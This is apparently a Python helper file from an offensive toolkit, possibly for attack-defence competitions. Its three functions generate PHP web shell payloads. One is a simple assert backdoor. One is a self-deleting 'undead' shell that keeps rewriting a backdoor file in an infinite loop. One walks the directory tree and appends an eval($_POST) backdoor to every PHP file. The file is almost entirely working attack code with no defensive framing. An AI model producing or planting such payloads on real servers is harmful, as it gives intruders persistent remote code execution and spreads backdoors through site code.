
def ma_ordinary(phpfile_Key):
    payload = f"<?php @assert($_POST[{phpfile_Key}]); ?>"
    return payload

def ma_UndeadHorse(phpfile_Name, phpfile_Key):
    payload = ''
    payload += '<?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='
    payload += "\""
    payload += phpfile_Name + "f0r.php"
    payload += "\""
    payload += ';$code='
    payload += "\""
    payload += f"<?php @assert(\$_POST[{phpfile_Key}]);"
    payload += "\""
    payload += ';while(1){file_put_contents($file,$code);usleep(5000);} ?>'
    return payload

def ma_RuChong(phpfile_Key):
     payload = ""
     payload += "<?php $backdoor="
     payload += "\""
     payload += f"<?php @eval($_POST[{phpfile_Key}]); ?>"
     payload += "\""
     payload += ";foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator("
     payload += "."
     payload += "\'"
     payload += ")) as $filename) {if ($filename->isFile() &&"
     payload += "\$filename->getExtension() == "
     payload += "\'"
     payload += "php"
     payload += "\'"
     payload += ") {$content = file_get_contents($filename);if (strpos($content, $backdoor) === false) {file_put_contents(\$filename, $content . $backdoor);"
     payload += "echo "
     payload += "\""
     payload += "success"
     payload += "\""
     payload += " . $filename . "
     payload += "\""
     payload += "intofile"
     payload += "\""
     payload += ";}}}"
     return payload